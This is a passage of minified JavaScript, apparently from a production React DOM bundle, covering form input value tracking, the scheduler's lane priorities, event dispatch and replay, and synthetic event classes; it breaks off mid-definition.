    if (!e.hasOwnProperty(t) && typeof n < "u" && typeof n.get == "function" && typeof n.set == "function") {
        var o = n.get,
            s = n.set;
        return (
            Object.defineProperty(e, t, {
                configurable: !0,
                get: function () {
                    return o.call(this);
                },
                set: function (i) {
                    (r = "" + i), s.call(this, i);
                },
            }),
            Object.defineProperty(e, t, { enumerable: n.enumerable }),
            {
                getValue: function () {
                    return r;
                },
                setValue: function (i) {
                    r = "" + i;
                },
                stopTracking: function () {
                    (e._valueTracker = null), delete e[t];
                },
            }
        );
    }
}
function Ds(e) {
    e._valueTracker || (e._valueTracker = Zy(e));
}
function Mf(e) {
    if (!e) return !1;
    var t = e._valueTracker;
    if (!t) return !0;
    var n = t.getValue(),
        r = "";
    return e && (r = Af(e) ? (e.checked ? "true" : "false") : e.value), (e = r), e !== n ? (t.setValue(e), !0) : !1;
}
function Si(e) {
    if (((e = e || (typeof document < "u" ? document : void 0)), typeof e > "u")) return null;
    try {
        return e.activeElement || e.body;
    } catch {
        return e.body;
    }
}
function Cl(e, t) {
    var n = t.checked;
    return pe({}, t, {
        defaultChecked: void 0,
        defaultValue: void 0,
        value: void 0,
        checked: n ?? e._wrapperState.initialChecked,
    });
}
function ad(e, t) {
    var n = t.defaultValue == null ? "" : t.defaultValue,
        r = t.checked != null ? t.checked : t.defaultChecked;
    (n = Dn(t.value != null ? t.value : n)),
        (e._wrapperState = {
            initialChecked: r,
            initialValue: n,
            controlled: t.type === "checkbox" || t.type === "radio" ? t.checked != null : t.value != null,
        });
}
function _f(e, t) {
    (t = t.checked), t != null && zc(e, "checked", t, !1);
}
function El(e, t) {
    _f(e, t);
    var n = Dn(t.value),
        r = t.type;
    if (n != null)
        r === "number"
            ? ((n === 0 && e.value === "") || e.value != n) && (e.value = "" + n)
            : e.value !== "" + n && (e.value = "" + n);
    else if (r === "submit" || r === "reset") {
        e.removeAttribute("value");
        return;
    }
    t.hasOwnProperty("value")
        ? Nl(e, t.type, n)
        : t.hasOwnProperty("defaultValue") && Nl(e, t.type, Dn(t.defaultValue)),
        t.checked == null && t.defaultChecked != null && (e.defaultChecked = !!t.defaultChecked);
}
function ld(e, t, n) {
    if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
        var r = t.type;
        if (!((r !== "submit" && r !== "reset") || (t.value !== void 0 && t.value !== null))) return;
        (t = "" + e._wrapperState.initialValue), n || t === e.value || (e.value = t), (e.defaultValue = t);
    }
    (n = e.name),
        n !== "" && (e.name = ""),
        (e.defaultChecked = !!e._wrapperState.initialChecked),
        n !== "" && (e.name = n);
}
function Nl(e, t, n) {
    (t !== "number" || Si(e.ownerDocument) !== e) &&
        (n == null
            ? (e.defaultValue = "" + e._wrapperState.initialValue)
            : e.defaultValue !== "" + n && (e.defaultValue = "" + n));
}
var zo = Array.isArray;
function Hr(e, t, n, r) {
    if (((e = e.options), t)) {
        t = {};
        for (var o = 0; o < n.length; o++) t["$" + n[o]] = !0;
        for (n = 0; n < e.length; n++)
            (o = t.hasOwnProperty("$" + e[n].value)),
                e[n].selected !== o && (e[n].selected = o),
                o && r && (e[n].defaultSelected = !0);
    } else {
        for (n = "" + Dn(n), t = null, o = 0; o < e.length; o++) {
            if (e[o].value === n) {
                (e[o].selected = !0), r && (e[o].defaultSelected = !0);
                return;
            }
            t !== null || e[o].disabled || (t = e[o]);
        }
        t !== null && (t.selected = !0);
    }
}
function Pl(e, t) {
    if (t.dangerouslySetInnerHTML != null) throw Error(R(91));
    return pe({}, t, { value: void 0, defaultValue: void 0, children: "" + e._wrapperState.initialValue });
}
function cd(e, t) {
    var n = t.value;
    if (n == null) {
        if (((n = t.children), (t = t.defaultValue), n != null)) {
            if (t != null) throw Error(R(92));
            if (zo(n)) {
                if (1 < n.length) throw Error(R(93));
                n = n[0];
            }
            t = n;
        }
        t == null && (t = ""), (n = t);
    }
    e._wrapperState = { initialValue: Dn(n) };
}
function Lf(e, t) {
    var n = Dn(t.value),
        r = Dn(t.defaultValue);
    n != null &&
        ((n = "" + n),
        n !== e.value && (e.value = n),
        t.defaultValue == null && e.defaultValue !== n && (e.defaultValue = n)),
        r != null && (e.defaultValue = "" + r);
}
function ud(e) {
    var t = e.textContent;
    t === e._wrapperState.initialValue && t !== "" && t !== null && (e.value = t);
}
function Of(e) {
    switch (e) {
        case "svg":
            return "http://www.w3.org/2000/svg";
        case "math":
            return "http://www.w3.org/1998/Math/MathML";
        default:
            return "http://www.w3.org/1999/xhtml";
    }
}
function Tl(e, t) {
    return e == null || e === "http://www.w3.org/1999/xhtml"
        ? Of(t)
        : e === "http://www.w3.org/2000/svg" && t === "foreignObject"
          ? "http://www.w3.org/1999/xhtml"
          : e;
}
var zs,
    If = (function (e) {
        return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction
            ? function (t, n, r, o) {
                  MSApp.execUnsafeLocalFunction(function () {
                      return e(t, n, r, o);
                  });
              }
            : e;
    })(function (e, t) {
        if (e.namespaceURI !== "http://www.w3.org/2000/svg" || "innerHTML" in e) e.innerHTML = t;
        else {
            for (
                zs = zs || document.createElement("div"),
                    zs.innerHTML = "<svg>" + t.valueOf().toString() + "</svg>",
                    t = zs.firstChild;
                e.firstChild;

            )
                e.removeChild(e.firstChild);
            for (; t.firstChild; ) e.appendChild(t.firstChild);
        }
    });
function Jo(e, t) {
    if (t) {
        var n = e.firstChild;
        if (n && n === e.lastChild && n.nodeType === 3) {
            n.nodeValue = t;
            return;
        }
    }
    e.textContent = t;
}
var $o = {
        animationIterationCount: !0,
        aspectRatio: !0,
        borderImageOutset: !0,
        borderImageSlice: !0,
        borderImageWidth: !0,
        boxFlex: !0,
        boxFlexGroup: !0,
        boxOrdinalGroup: !0,
        columnCount: !0,
        columns: !0,
        flex: !0,
        flexGrow: !0,
        flexPositive: !0,
        flexShrink: !0,
        flexNegative: !0,
        flexOrder: !0,
        gridArea: !0,
        gridRow: !0,
        gridRowEnd: !0,
        gridRowSpan: !0,
        gridRowStart: !0,
        gridColumn: !0,
        gridColumnEnd: !0,
        gridColumnSpan: !0,
        gridColumnStart: !0,
        fontWeight: !0,
        lineClamp: !0,
        lineHeight: !0,
        opacity: !0,
        order: !0,
        orphans: !0,
        tabSize: !0,
        widows: !0,
        zIndex: !0,
        zoom: !0,
        fillOpacity: !0,
        floodOpacity: !0,
        stopOpacity: !0,
        strokeDasharray: !0,
        strokeDashoffset: !0,
        strokeMiterlimit: !0,
        strokeOpacity: !0,
        strokeWidth: !0,
    },
    Jy = ["Webkit", "ms", "Moz", "O"];
Object.keys($o).forEach(function (e) {
    Jy.forEach(function (t) {
        (t = t + e.charAt(0).toUpperCase() + e.substring(1)), ($o[t] = $o[e]);
    });
});
function Df(e, t, n) {
    return t == null || typeof t == "boolean" || t === ""
        ? ""
        : n || typeof t != "number" || t === 0 || ($o.hasOwnProperty(e) && $o[e])
          ? ("" + t).trim()
          : t + "px";
}
function zf(e, t) {
    e = e.style;
    for (var n in t)
        if (t.hasOwnProperty(n)) {
            var r = n.indexOf("--") === 0,
                o = Df(n, t[n], r);
            n === "float" && (n = "cssFloat"), r ? e.setProperty(n, o) : (e[n] = o);
        }
}
var e0 = pe(
    { menuitem: !0 },
    {
        area: !0,
        base: !0,
        br: !0,
        col: !0,
        embed: !0,
        hr: !0,
        img: !0,
        input: !0,
        keygen: !0,
        link: !0,
        meta: !0,
        param: !0,
        source: !0,
        track: !0,
        wbr: !0,
    }
);
function jl(e, t) {
    if (t) {
        if (e0[e] && (t.children != null || t.dangerouslySetInnerHTML != null)) throw Error(R(137, e));
        if (t.dangerouslySetInnerHTML != null) {
            if (t.children != null) throw Error(R(60));
            if (typeof t.dangerouslySetInnerHTML != "object" || !("__html" in t.dangerouslySetInnerHTML))
                throw Error(R(61));
        }
        if (t.style != null && typeof t.style != "object") throw Error(R(62));
    }
}
function Rl(e, t) {
    if (e.indexOf("-") === -1) return typeof t.is == "string";
    switch (e) {
        case "annotation-xml":
        case "color-profile":
        case "font-face":
        case "font-face-src":
        case "font-face-uri":
        case "font-face-format":
        case "font-face-name":
        case "missing-glyph":
            return !1;
        default:
            return !0;
    }
}
var Al = null;
function Hc(e) {
    return (
        (e = e.target || e.srcElement || window),
        e.correspondingUseElement && (e = e.correspondingUseElement),
        e.nodeType === 3 ? e.parentNode : e
    );
}
var Ml = null,
    Br = null,
    Vr = null;
function dd(e) {
    if ((e = Ns(e))) {
        if (typeof Ml != "function") throw Error(R(280));
        var t = e.stateNode;
        t && ((t = aa(t)), Ml(e.stateNode, e.type, t));
    }
}
function Ff(e) {
    Br ? (Vr ? Vr.push(e) : (Vr = [e])) : (Br = e);
}
function Uf() {
    if (Br) {
        var e = Br,
            t = Vr;
        if (((Vr = Br = null), dd(e), t)) for (e = 0; e < t.length; e++) dd(t[e]);
    }
}
function $f(e, t) {
    return e(t);
}
function Hf() {}
var Da = !1;
function Bf(e, t, n) {
    if (Da) return e(t, n);
    Da = !0;
    try {
        return $f(e, t, n);
    } finally {
        (Da = !1), (Br !== null || Vr !== null) && (Hf(), Uf());
    }
}
function es(e, t) {
    var n = e.stateNode;
    if (n === null) return null;
    var r = aa(n);
    if (r === null) return null;
    n = r[t];
    e: switch (t) {
        case "onClick":
        case "onClickCapture":
        case "onDoubleClick":
        case "onDoubleClickCapture":
        case "onMouseDown":
        case "onMouseDownCapture":
        case "onMouseMove":
        case "onMouseMoveCapture":
        case "onMouseUp":
        case "onMouseUpCapture":
        case "onMouseEnter":
            (r = !r.disabled) ||
                ((e = e.type), (r = !(e === "button" || e === "input" || e === "select" || e === "textarea"))),
                (e = !r);
            break e;
        default:
            e = !1;
    }
    if (e) return null;
    if (n && typeof n != "function") throw Error(R(231, t, typeof n));
    return n;
}
var _l = !1;
if (Jt)
    try {
        var Po = {};
        Object.defineProperty(Po, "passive", {
            get: function () {
                _l = !0;
            },
        }),
            window.addEventListener("test", Po, Po),
            window.removeEventListener("test", Po, Po);
    } catch {
        _l = !1;
    }
function t0(e, t, n, r, o, s, i, a, l) {
    var u = Array.prototype.slice.call(arguments, 3);
    try {
        t.apply(n, u);
    } catch (d) {
        this.onError(d);
    }
}
var Ho = !1,
    bi = null,
    ki = !1,
    Ll = null,
    n0 = {
        onError: function (e) {
            (Ho = !0), (bi = e);
        },
    };
function r0(e, t, n, r, o, s, i, a, l) {
    (Ho = !1), (bi = null), t0.apply(n0, arguments);
}
function o0(e, t, n, r, o, s, i, a, l) {
    if ((r0.apply(this, arguments), Ho)) {
        if (Ho) {
            var u = bi;
            (Ho = !1), (bi = null);
        } else throw Error(R(198));
        ki || ((ki = !0), (Ll = u));
    }
}
function gr(e) {
    var t = e,
        n = e;
    if (e.alternate) for (; t.return; ) t = t.return;
    else {
        e = t;
        do (t = e), t.flags & 4098 && (n = t.return), (e = t.return);
        while (e);
    }
    return t.tag === 3 ? n : null;
}
function Vf(e) {
    if (e.tag === 13) {
        var t = e.memoizedState;
        if ((t === null && ((e = e.alternate), e !== null && (t = e.memoizedState)), t !== null)) return t.dehydrated;
    }
    return null;
}
function pd(e) {
    if (gr(e) !== e) throw Error(R(188));
}
function s0(e) {
    var t = e.alternate;
    if (!t) {
        if (((t = gr(e)), t === null)) throw Error(R(188));
        return t !== e ? null : e;
    }
    for (var n = e, r = t; ; ) {
        var o = n.return;
        if (o === null) break;
        var s = o.alternate;
        if (s === null) {
            if (((r = o.return), r !== null)) {
                n = r;
                continue;
            }
            break;
        }
        if (o.child === s.child) {
            for (s = o.child; s; ) {
                if (s === n) return pd(o), e;
                if (s === r) return pd(o), t;
                s = s.sibling;
            }
            throw Error(R(188));
        }
        if (n.return !== r.return) (n = o), (r = s);
        else {
            for (var i = !1, a = o.child; a; ) {
                if (a === n) {
                    (i = !0), (n = o), (r = s);
                    break;
                }
                if (a === r) {
                    (i = !0), (r = o), (n = s);
                    break;
                }
                a = a.sibling;
            }
            if (!i) {
                for (a = s.child; a; ) {
                    if (a === n) {
                        (i = !0), (n = s), (r = o);
                        break;
                    }
                    if (a === r) {
                        (i = !0), (r = s), (n = o);
                        break;
                    }
                    a = a.sibling;
                }
                if (!i) throw Error(R(189));
            }
        }
        if (n.alternate !== r) throw Error(R(190));
    }
    if (n.tag !== 3) throw Error(R(188));
    return n.stateNode.current === n ? e : t;
}
function Wf(e) {
    return (e = s0(e)), e !== null ? Kf(e) : null;
}
function Kf(e) {
    if (e.tag === 5 || e.tag === 6) return e;
    for (e = e.child; e !== null; ) {
        var t = Kf(e);
        if (t !== null) return t;
        e = e.sibling;
    }
    return null;
}
var Qf = Ze.unstable_scheduleCallback,
    fd = Ze.unstable_cancelCallback,
    i0 = Ze.unstable_shouldYield,
    a0 = Ze.unstable_requestPaint,
    ye = Ze.unstable_now,
    l0 = Ze.unstable_getCurrentPriorityLevel,
    Bc = Ze.unstable_ImmediatePriority,
    Gf = Ze.unstable_UserBlockingPriority,
    Ci = Ze.unstable_NormalPriority,
    c0 = Ze.unstable_LowPriority,
    qf = Ze.unstable_IdlePriority,
    ra = null,
    Dt = null;
function u0(e) {
    if (Dt && typeof Dt.onCommitFiberRoot == "function")
        try {
            Dt.onCommitFiberRoot(ra, e, void 0, (e.current.flags & 128) === 128);
        } catch {}
}
var kt = Math.clz32 ? Math.clz32 : f0,
    d0 = Math.log,
    p0 = Math.LN2;
function f0(e) {
    return (e >>>= 0), e === 0 ? 32 : (31 - ((d0(e) / p0) | 0)) | 0;
}
var Fs = 64,
    Us = 4194304;
function Fo(e) {
    switch (e & -e) {
        case 1:
            return 1;
        case 2:
            return 2;
        case 4:
            return 4;
        case 8:
            return 8;
        case 16:
            return 16;
        case 32:
            return 32;
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return e & 4194240;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
            return e & 130023424;
        case 134217728:
            return 134217728;
        case 268435456:
            return 268435456;
        case 536870912:
            return 536870912;
        case 1073741824:
            return 1073741824;
        default:
            return e;
    }
}
function Ei(e, t) {
    var n = e.pendingLanes;
    if (n === 0) return 0;
    var r = 0,
        o = e.suspendedLanes,
        s = e.pingedLanes,
        i = n & 268435455;
    if (i !== 0) {
        var a = i & ~o;
        a !== 0 ? (r = Fo(a)) : ((s &= i), s !== 0 && (r = Fo(s)));
    } else (i = n & ~o), i !== 0 ? (r = Fo(i)) : s !== 0 && (r = Fo(s));
    if (r === 0) return 0;
    if (t !== 0 && t !== r && !(t & o) && ((o = r & -r), (s = t & -t), o >= s || (o === 16 && (s & 4194240) !== 0)))
        return t;
    if ((r & 4 && (r |= n & 16), (t = e.entangledLanes), t !== 0))
        for (e = e.entanglements, t &= r; 0 < t; ) (n = 31 - kt(t)), (o = 1 << n), (r |= e[n]), (t &= ~o);
    return r;
}
function m0(e, t) {
    switch (e) {
        case 1:
        case 2:
        case 4:
            return t + 250;
        case 8:
        case 16:
        case 32:
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return t + 5e3;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
            return -1;
        case 134217728:
        case 268435456:
        case 536870912:
        case 1073741824:
            return -1;
        default:
            return -1;
    }
}
function h0(e, t) {
    for (var n = e.suspendedLanes, r = e.pingedLanes, o = e.expirationTimes, s = e.pendingLanes; 0 < s; ) {
        var i = 31 - kt(s),
            a = 1 << i,
            l = o[i];
        l === -1 ? (!(a & n) || a & r) && (o[i] = m0(a, t)) : l <= t && (e.expiredLanes |= a), (s &= ~a);
    }
}
function Ol(e) {
    return (e = e.pendingLanes & -1073741825), e !== 0 ? e : e & 1073741824 ? 1073741824 : 0;
}
function Xf() {
    var e = Fs;
    return (Fs <<= 1), !(Fs & 4194240) && (Fs = 64), e;
}
function za(e) {
    for (var t = [], n = 0; 31 > n; n++) t.push(e);
    return t;
}
function Cs(e, t, n) {
    (e.pendingLanes |= t),
        t !== 536870912 && ((e.suspendedLanes = 0), (e.pingedLanes = 0)),
        (e = e.eventTimes),
        (t = 31 - kt(t)),
        (e[t] = n);
}
function g0(e, t) {
    var n = e.pendingLanes & ~t;
    (e.pendingLanes = t),
        (e.suspendedLanes = 0),
        (e.pingedLanes = 0),
        (e.expiredLanes &= t),
        (e.mutableReadLanes &= t),
        (e.entangledLanes &= t),
        (t = e.entanglements);
    var r = e.eventTimes;
    for (e = e.expirationTimes; 0 < n; ) {
        var o = 31 - kt(n),
            s = 1 << o;
        (t[o] = 0), (r[o] = -1), (e[o] = -1), (n &= ~s);
    }
}
function Vc(e, t) {
    var n = (e.entangledLanes |= t);
    for (e = e.entanglements; n; ) {
        var r = 31 - kt(n),
            o = 1 << r;
        (o & t) | (e[r] & t) && (e[r] |= t), (n &= ~o);
    }
}
var te = 0;
function Yf(e) {
    return (e &= -e), 1 < e ? (4 < e ? (e & 268435455 ? 16 : 536870912) : 4) : 1;
}
var Zf,
    Wc,
    Jf,
    em,
    tm,
    Il = !1,
    $s = [],
    Tn = null,
    jn = null,
    Rn = null,
    ts = new Map(),
    ns = new Map(),
    vn = [],
    y0 =
        "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(
            " "
        );
function md(e, t) {
    switch (e) {
        case "focusin":
        case "focusout":
            Tn = null;
            break;
        case "dragenter":
        case "dragleave":
            jn = null;
            break;
        case "mouseover":
        case "mouseout":
            Rn = null;
            break;
        case "pointerover":
        case "pointerout":
            ts.delete(t.pointerId);
            break;
        case "gotpointercapture":
        case "lostpointercapture":
            ns.delete(t.pointerId);
    }
}
function To(e, t, n, r, o, s) {
    return e === null || e.nativeEvent !== s
        ? ((e = { blockedOn: t, domEventName: n, eventSystemFlags: r, nativeEvent: s, targetContainers: [o] }),
          t !== null && ((t = Ns(t)), t !== null && Wc(t)),
          e)
        : ((e.eventSystemFlags |= r), (t = e.targetContainers), o !== null && t.indexOf(o) === -1 && t.push(o), e);
}
function v0(e, t, n, r, o) {
    switch (t) {
        case "focusin":
            return (Tn = To(Tn, e, t, n, r, o)), !0;
        case "dragenter":
            return (jn = To(jn, e, t, n, r, o)), !0;
        case "mouseover":
            return (Rn = To(Rn, e, t, n, r, o)), !0;
        case "pointerover":
            var s = o.pointerId;
            return ts.set(s, To(ts.get(s) || null, e, t, n, r, o)), !0;
        case "gotpointercapture":
            return (s = o.pointerId), ns.set(s, To(ns.get(s) || null, e, t, n, r, o)), !0;
    }
    return !1;
}
function nm(e) {
    var t = Yn(e.target);
    if (t !== null) {
        var n = gr(t);
        if (n !== null) {
            if (((t = n.tag), t === 13)) {
                if (((t = Vf(n)), t !== null)) {
                    (e.blockedOn = t),
                        tm(e.priority, function () {
                            Jf(n);
                        });
                    return;
                }
            } else if (t === 3 && n.stateNode.current.memoizedState.isDehydrated) {
                e.blockedOn = n.tag === 3 ? n.stateNode.containerInfo : null;
                return;
            }
        }
    }
    e.blockedOn = null;
}
function li(e) {
    if (e.blockedOn !== null) return !1;
    for (var t = e.targetContainers; 0 < t.length; ) {
        var n = Dl(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
        if (n === null) {
            n = e.nativeEvent;
            var r = new n.constructor(n.type, n);
            (Al = r), n.target.dispatchEvent(r), (Al = null);
        } else return (t = Ns(n)), t !== null && Wc(t), (e.blockedOn = n), !1;
        t.shift();
    }
    return !0;
}
function hd(e, t, n) {
    li(e) && n.delete(t);
}
function x0() {
    (Il = !1),
        Tn !== null && li(Tn) && (Tn = null),
        jn !== null && li(jn) && (jn = null),
        Rn !== null && li(Rn) && (Rn = null),
        ts.forEach(hd),
        ns.forEach(hd);
}
function jo(e, t) {
    e.blockedOn === t &&
        ((e.blockedOn = null), Il || ((Il = !0), Ze.unstable_scheduleCallback(Ze.unstable_NormalPriority, x0)));
}
function rs(e) {
    function t(o) {
        return jo(o, e);
    }
    if (0 < $s.length) {
        jo($s[0], e);
        for (var n = 1; n < $s.length; n++) {
            var r = $s[n];
            r.blockedOn === e && (r.blockedOn = null);
        }
    }
    for (
        Tn !== null && jo(Tn, e),
            jn !== null && jo(jn, e),
            Rn !== null && jo(Rn, e),
            ts.forEach(t),
            ns.forEach(t),
            n = 0;
        n < vn.length;
        n++
    )
        (r = vn[n]), r.blockedOn === e && (r.blockedOn = null);
    for (; 0 < vn.length && ((n = vn[0]), n.blockedOn === null); ) nm(n), n.blockedOn === null && vn.shift();
}
var Wr = sn.ReactCurrentBatchConfig,
    Ni = !0;
function w0(e, t, n, r) {
    var o = te,
        s = Wr.transition;
    Wr.transition = null;
    try {
        (te = 1), Kc(e, t, n, r);
    } finally {
        (te = o), (Wr.transition = s);
    }
}
function S0(e, t, n, r) {
    var o = te,
        s = Wr.transition;
    Wr.transition = null;
    try {
        (te = 4), Kc(e, t, n, r);
    } finally {
        (te = o), (Wr.transition = s);
    }
}
function Kc(e, t, n, r) {
    if (Ni) {
        var o = Dl(e, t, n, r);
        if (o === null) Ga(e, t, r, Pi, n), md(e, r);
        else if (v0(o, e, t, n, r)) r.stopPropagation();
        else if ((md(e, r), t & 4 && -1 < y0.indexOf(e))) {
            for (; o !== null; ) {
                var s = Ns(o);
                if ((s !== null && Zf(s), (s = Dl(e, t, n, r)), s === null && Ga(e, t, r, Pi, n), s === o)) break;
                o = s;
            }
            o !== null && r.stopPropagation();
        } else Ga(e, t, r, null, n);
    }
}
var Pi = null;
function Dl(e, t, n, r) {
    if (((Pi = null), (e = Hc(r)), (e = Yn(e)), e !== null))
        if (((t = gr(e)), t === null)) e = null;
        else if (((n = t.tag), n === 13)) {
            if (((e = Vf(t)), e !== null)) return e;
            e = null;
        } else if (n === 3) {
            if (t.stateNode.current.memoizedState.isDehydrated) return t.tag === 3 ? t.stateNode.containerInfo : null;
            e = null;
        } else t !== e && (e = null);
    return (Pi = e), null;
}
function rm(e) {
    switch (e) {
        case "cancel":
        case "click":
        case "close":
        case "contextmenu":
        case "copy":
        case "cut":
        case "auxclick":
        case "dblclick":
        case "dragend":
        case "dragstart":
        case "drop":
        case "focusin":
        case "focusout":
        case "input":
        case "invalid":
        case "keydown":
        case "keypress":
        case "keyup":
        case "mousedown":
        case "mouseup":
        case "paste":
        case "pause":
        case "play":
        case "pointercancel":
        case "pointerdown":
        case "pointerup":
        case "ratechange":
        case "reset":
        case "resize":
        case "seeked":
        case "submit":
        case "touchcancel":
        case "touchend":
        case "touchstart":
        case "volumechange":
        case "change":
        case "selectionchange":
        case "textInput":
        case "compositionstart":
        case "compositionend":
        case "compositionupdate":
        case "beforeblur":
        case "afterblur":
        case "beforeinput":
        case "blur":
        case "fullscreenchange":
        case "focus":
        case "hashchange":
        case "popstate":
        case "select":
        case "selectstart":
            return 1;
        case "drag":
        case "dragenter":
        case "dragexit":
        case "dragleave":
        case "dragover":
        case "mousemove":
        case "mouseout":
        case "mouseover":
        case "pointermove":
        case "pointerout":
        case "pointerover":
        case "scroll":
        case "toggle":
        case "touchmove":
        case "wheel":
        case "mouseenter":
        case "mouseleave":
        case "pointerenter":
        case "pointerleave":
            return 4;
        case "message":
            switch (l0()) {
                case Bc:
                    return 1;
                case Gf:
                    return 4;
                case Ci:
                case c0:
                    return 16;
                case qf:
                    return 536870912;
                default:
                    return 16;
            }
        default:
            return 16;
    }
}
var En = null,
    Qc = null,
    ci = null;
function om() {
    if (ci) return ci;
    var e,
        t = Qc,
        n = t.length,
        r,
        o = "value" in En ? En.value : En.textContent,
        s = o.length;
    for (e = 0; e < n && t[e] === o[e]; e++);
    var i = n - e;
    for (r = 1; r <= i && t[n - r] === o[s - r]; r++);
    return (ci = o.slice(e, 1 < r ? 1 - r : void 0));
}
function ui(e) {
    var t = e.keyCode;
    return (
        "charCode" in e ? ((e = e.charCode), e === 0 && t === 13 && (e = 13)) : (e = t),
        e === 10 && (e = 13),
        32 <= e || e === 13 ? e : 0
    );
}
function Hs() {
    return !0;
}
function gd() {
    return !1;
}
function et(e) {
    function t(n, r, o, s, i) {
        (this._reactName = n),
            (this._targetInst = o),
            (this.type = r),
            (this.nativeEvent = s),
            (this.target = i),
            (this.currentTarget = null);
        for (var a in e) e.hasOwnProperty(a) && ((n = e[a]), (this[a] = n ? n(s) : s[a]));
        return (
            (this.isDefaultPrevented = (s.defaultPrevented != null ? s.defaultPrevented : s.returnValue === !1)
                ? Hs
                : gd),
            (this.isPropagationStopped = gd),
            this
        );
    }
    return (
        pe(t.prototype, {
            preventDefault: function () {
                this.defaultPrevented = !0;
                var n = this.nativeEvent;
                n &&
                    (n.preventDefault ? n.preventDefault() : typeof n.returnValue != "unknown" && (n.returnValue = !1),
                    (this.isDefaultPrevented = Hs));
            },
            stopPropagation: function () {
                var n = this.nativeEvent;
                n &&
                    (n.stopPropagation
                        ? n.stopPropagation()
                        : typeof n.cancelBubble != "unknown" && (n.cancelBubble = !0),
                    (this.isPropagationStopped = Hs));
            },
            persist: function () {},
            isPersistent: Hs,
        }),
        t
    );
}
var yo = {
        eventPhase: 0,
        bubbles: 0,
        cancelable: 0,
        timeStamp: function (e) {
            return e.timeStamp || Date.now();
        },
        defaultPrevented: 0,
        isTrusted: 0,
    },
    Gc = et(yo),
    Es = pe({}, yo, { view: 0, detail: 0 }),
    b0 = et(Es),
    Fa,
    Ua,
    Ro,
    oa = pe({}, Es, {
        screenX: 0,
        screenY: 0,
        clientX: 0,
        clientY: 0,
        pageX: 0,
        pageY: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        getModifierState: qc,
        button: 0,
        buttons: 0,
        relatedTarget: function (e) {
            return e.relatedTarget === void 0
                ? e.fromElement === e.srcElement
                    ? e.toElement
                    : e.fromElement
                : e.relatedTarget;
        },
        movementX: function (e) {
            return "movementX" in e
                ? e.movementX
                : (e !== Ro &&
                      (Ro && e.type === "mousemove"
                          ? ((Fa = e.screenX - Ro.screenX), (Ua = e.screenY - Ro.screenY))
                          : (Ua = Fa = 0),
                      (Ro = e)),
                  Fa);
        },
        movementY: function (e) {
            return "movementY" in e ? e.movementY : Ua;
        },
    }),
    yd = et(oa),
    k0 = pe({}, oa, { dataTransfer: 0 }),
    C0 = et(k0),
    E0 = pe({}, Es, { relatedTarget: 0 }),
    $a = et(E0),
    N0 = pe({}, yo, { animationName: 0, elapsedTime: 0, pseudoElement: 0 }),
    P0 = et(N0),
    T0 = pe({}, yo, {
        clipboardData: function (e) {
            return "clipboardData" in e ? e.clipboardData : window.clipboardData;
        },
    }),
    j0 = et(T0),
    R0 = pe({}, yo, { data: 0 }),
    vd = et(R0),
    A0 = {
        Esc: "Escape",
        Spacebar: " ",
        Left: "ArrowLeft",
        Up: "ArrowUp",
        Right: "ArrowRight",
        Down: "ArrowDown",
        Del: "Delete",
        Win: "OS",
        Menu: "ContextMenu",
        Apps: "ContextMenu",
        Scroll: "ScrollLock",
        MozPrintableKey: "Unidentified",
    },
    M0 = {
        8: "Backspace",
        9: "Tab",
        12: "Clear",
        13: "Enter",
        16: "Shift",
        17: "Control",
        18: "Alt",
        19: "Pause",
        20: "CapsLock",
        27: "Escape",
        32: " ",
        33: "PageUp",
        34: "PageDown",
        35: "End",
        36: "Home",
        37: "ArrowLeft",
        38: "ArrowUp",
        39: "ArrowRight",
        40: "ArrowDown",
        45: "Insert",
        46: "Delete",
        112: "F1",
        113: "F2",
        114: "F3",
        115: "F4",
        116: "F5",
        117: "F6",
        118: "F7",
        119: "F8",
        120: "F9",
        121: "F10",
        122: "F11",
        123: "F12",
        144: "NumLock",
        145: "ScrollLock",
        224: "Meta",
    },
    _0 = { Alt: "altKey", Control: "ctrlKey", Meta: "metaKey", Shift: "shiftKey" };
function L0(e) {
    var t = this.nativeEvent;
    return t.getModifierState ? t.getModifierState(e) : (e = _0[e]) ? !!t[e] : !1;
}
function qc() {
    return L0;
}
var O0 = pe({}, Es, {
        key: function (e) {
            if (e.key) {
                var t = A0[e.key] || e.key;
                if (t !== "Unidentified") return t;
            }
            return e.type === "keypress"
                ? ((e = ui(e)), e === 13 ? "Enter" : String.fromCharCode(e))
                : e.type === "keydown" || e.type === "keyup"
                  ? M0[e.keyCode] || "Unidentified"
                  : "";
        },
        code: 0,
        location: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        repeat: 0,
        locale: 0,
        getModifierState: qc,
        charCode: function (e) {
            return e.type === "keypress" ? ui(e) : 0;
        },
        keyCode: function (e) {
            return e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0;
        },
        which: function (e) {
            return e.type === "keypress" ? ui(e) : e.type === "keydown" || e.type === "keyup" ? e.keyCode : 0;
        },
    }),
    I0 = et(O0),
    D0 = pe({}, oa, {
        pointerId: 0,
        width: 0,
        height: 0,
        pressure: 0,
        tangentialPressure: 0,
        tiltX: 0,
        tiltY: 0,
        twist: 0,
        pointerType: 0,
        isPrimary: 0,
    }),
    xd = et(D0),
    z0 = pe({}, Es, {
        touches: 0,
        targetTouches: 0,
        changedTouches: 0,
        altKey: 0,
        metaKey: 0,
        ctrlKey: 0,
        shiftKey: 0,
        getModifierState: qc,
    }),
    F0 = et(z0),
    U0 = pe({}, yo, { propertyName: 0, elapsedTime: 0, pseudoElement: 0 }),
    $0 = et(U0),
    H0 = pe({}, oa, {
        deltaX: function (e) {
            return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0;
        },
        deltaY: function (e) {
            return "deltaY" in e
